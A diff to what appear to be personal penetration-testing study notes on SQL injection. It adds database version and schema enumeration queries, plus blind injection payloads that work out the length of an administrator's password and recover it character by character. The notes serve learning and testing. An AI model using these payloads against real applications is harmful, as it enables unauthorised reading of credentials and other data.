@@ -120,6 +120,39 @@ SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’
 SELECT version FROM v$instance
 {% endhighlight %}
 
+The queries to determine the database version for some popular database types are as follows:
+
+|   |   |
+|---|---|
+|Database type|Query|
+|Microsoft, MySQL|`SELECT @@version`|
+|Oracle|`SELECT * FROM v$version`|
+|PostgreSQL|`SELECT version()`|
+
+For most database types (notably excluding Oracle) a set of views called the *Information schema* can provide database information:
+{% highlight sql %}
+SELECT * FROM information_schema.tables
+{% endhighlight %}
+
+This will return something like this:
+
+| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
+| ------------- | ------------ | ---------- | ---------- |
+| MyDatabase    | dbo          | Products   | BASE TABLE |
+| MyDatabase    | dbo          | Users      | BASE TABLE |
+| OtherDatabase | public       | Feedback   | BASE TABLE | 
+
+Finding columns is simple after this:
+{% highlight sql %}
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+{% endhighlight %}
+
+Equivalent information for *Oracle*:
+{% highlight sql %}
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'Users'
+{% endhighlight %}
+
 ## Blind SQL Injection Vulnerabilities
 A blind SQL injection is where the application doesn't return the results of the query or the details of any database errors within its response. These vulnerabilities can still be exploited to access unauthorized data, however, techniques are generally more complicated and difficult to perform.
 
@@ -127,6 +160,23 @@ Depending on the nature of the vulnerability, the following techniques can be us
 - You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
 - You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the response time.
 - You can trigger an out-of-band network interaction, using [OAST](https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast) techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control.
+
+A nice way to determine the length of a field could be by iterating over a condition of its length:
+{% highlight sql %}
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'
+{% endhighlight %}
+
+For cracking the value you can repeat a similar technique by testing each letter one by 1:
+{% highlight sql %}
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b'
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c'
+...
+' AND (SELECT SUBSTRING(password,15,1) FROM users WHERE username='administrator')='a'
+' AND (SELECT SUBSTRING(password,16,1) FROM users WHERE username='administrator')='a'
+{% endhighlight %}
+
+This can then be automated in a simple script to determine the length and then crack the password (could even create a thread for each character and speed it up) or use a system like Burp Intruder for more basic automation
 
 ## Second-order SQL Injection
 First-order SQL injection is where an application takes user input from an HTTP request and incorporates the input into an SQL query in an unsafe way.
